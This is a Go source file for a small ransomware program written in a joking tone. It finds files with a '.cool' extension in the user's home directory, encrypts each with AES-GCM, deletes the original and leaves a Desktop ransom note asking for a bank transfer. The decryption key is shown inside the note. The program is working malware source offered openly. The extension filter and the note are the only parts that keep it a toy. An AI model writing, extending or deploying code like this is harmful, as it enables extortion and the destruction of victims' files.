package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func randStringRunes(amount int) string {
	bytePart := make([]rune, amount)
	for index := range bytePart {
		bytePart[index] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(bytePart)
}

/*
encrypt() is a function that takes in an argument of:
  - fileString (string path to a file)
  - keyString (hex string to use for an AES256 Cipher)

The following function works like this:

  - When encrypt() is run, we get the path to the file (fileString)

  - We convert the key (keyString) into a hexString, and acquire the plain text
    of the file that we're looking to encrypt

  - After that, we use the hex string with aes.NewCipher() to generate a basic
    AES encryption engine using the secret key provided

  - WHen we create a successful engine and run cipher.NewGCN() with the provided block,
    we create a GCM that returns a 128-bit block cipher wrapped in a Galois Counter Mode

  - After that, we generate a "nonce" byte slice for use with the next function to encrypt
    everything proper, which serves as a unique random number used once

  - Creating a seal, we run aesGCM.Seal() with the nonce and the plaintext in order
*/
func encrypt(fileString, keyString string) {
	fileData, err := os.ReadFile(fileString)
	if err != nil {
		fmt.Printf("error reading file: %v\b", err)
		return
	}

	hexString, _ := hex.DecodeString(keyString)
	plainText := []byte(fileData)

	block, err := aes.NewCipher(hexString)
	if err != nil {
		log.Fatal(err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err = io.ReadFull(crand.Reader, nonce); err != nil {
		log.Fatal(err)
	}

	aesGCMSeal := aesGCM.Seal(nonce, nonce, plainText, nil)

	os.WriteFile(fileString+".meow", aesGCMSeal, 0644)
	os.Remove(fileString)
}

/*
main() function handles the following:
  - Setting up initial variables
  - getting the current user, creating a random key, getting the home directory,
    scanning everything stored in the home directory, checking whether they match
    a specific extension (".cool"), encrypting, generating a readme file
*/
func main() {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	bytes := []byte(randStringRunes(32))
	key := hex.EncodeToString(bytes)

	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("error getting user home directory: %v\n", err)
		return
	}

	err = filepath.WalkDir(homeDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if !d.IsDir() {
			ext := strings.ToLower(filepath.Ext(d.Name()))

			if ext == ".cool" {
				encrypt(path, key)
				fmt.Println(path)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Printf("error walking the path: %v\n", err)
	}

	noteFile := usr.HomeDir + "\\Desktop\\" + "README_IMPORTANT.txt"
	message := fmt.Sprintf(`

	YOU'VE BEEN HIT BY, YOU'VE BEEN STRUCK BY-- A SMOOTH CRIMINAL!
	sorry to tell you buddy, but all your files are sent to purgatory... :3

	if you want them back, send approximately 10€ to my bank: 
	EE69 1337 6969 0420 1759

	and send proof of transfer to:
	email@email.com

	please i'm actually broke i want to buy a pepperoni pizza from my nearby pizzakiosk

	  /l、             
	 （ﾟ､ ｡ 7         
	  l  ~ヽ    my mischievous ascii cat named  
	  じしf_,)/ %s
	`, key)
	os.WriteFile(noteFile, []byte(message), 0644)
}
